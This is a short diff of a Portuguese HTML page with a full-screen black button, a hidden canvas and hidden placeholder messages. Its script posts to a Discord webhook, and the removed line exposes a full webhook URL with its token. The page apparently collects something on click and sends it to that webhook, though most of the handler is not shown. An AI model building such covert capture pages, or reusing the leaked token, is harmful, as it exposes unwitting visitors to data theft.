@@ -1,3 +1,43 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* Faz o botão ocupar a tela toda e remove espaços vazios */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background-color: #000;
+        }
+
+        #btn {
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            background-color: #000;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+        }
+
+        #mensagens {
+            color: white;
+            text-align: center;
+            padding-top: 20px;
+            font-family: sans-serif;
+        }
+        .vermelho { color: red; }
+        .verde { color: green; }
+    </style>
+</head>
+<body>
+
 <div id="mensagens" style="display:none;">
     <p class="vermelho">TEXTO TEXTO TEXTO</p>
     <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
@@ -10,7 +50,7 @@
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    const URL_WEBHOOK = 'https://discord.com/api/webhooks/1495823762464178316/JUtyoihcRDnKawG_caqxpZ-G4k7NlZpSMSD5TOYG_gZj6asa9SCXsN1d8G-VSstpePse';
+    const URL_WEBHOOK = 'https://discord.com';
 
     document.getElementById('btn').addEventListener('click', async function() {
         document.getElementById('mensagens').style.display = 'block';
@@ -61,3 +101,6 @@
         }
     });
 </script>
+
+</body>
+</html>
